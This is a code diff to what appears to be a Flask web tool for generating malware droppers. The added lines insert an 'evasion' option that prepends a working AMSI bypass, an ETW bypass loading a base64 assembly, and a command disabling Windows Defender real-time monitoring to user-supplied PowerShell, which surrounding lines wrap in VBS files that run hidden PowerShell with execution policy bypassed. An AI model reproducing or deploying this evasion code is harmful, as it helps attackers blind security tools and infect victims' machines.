@@ -451,6 +451,30 @@ def generate_ps():
     output_path = None
     if request.method == 'POST':
         ps1_code = request.form.get('ps1')
+        evasion_enabled = 'evasion_enabled' in request.form
+        if evasion_enabled:
+            amsi_bypass = """
+$A='System.Management.Automation.AmsiUtils';
+$B=[Ref].Assembly.GetType($A);
+$B.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+""".strip()
+
+            etw_bypass = """
+try {
+    [System.Reflection.Assembly]::Load([Convert]::FromBase64String(
+    '...')) | Out-Null
+} catch {}
+""".strip()
+
+            defender_disable = """
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+} catch {}
+""".strip()
+
+            evasion_code = "\n".join([amsi_bypass, etw_bypass, defender_disable])
+            ps1_code = f"{evasion_code}\n\n{ps1_code}"
+
         wrapper = request.form.get('format')
         filename = request.form.get('filename') or f"dropper_{wrapper}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{wrapper}"
         use_b64 = request.form.get('b64encode')  # Checkbox is present if checked, None if not
@@ -496,6 +520,7 @@ objShell.Run "powershell -w hidden -ep bypass -command \"{safe_ps}\"", 0'''
         output_path = filename  # Just filename for link
 
     return render_template("generate_ps.html", output_path=output_path)
+
 
 
 @app.route('/payloads/<filename>')
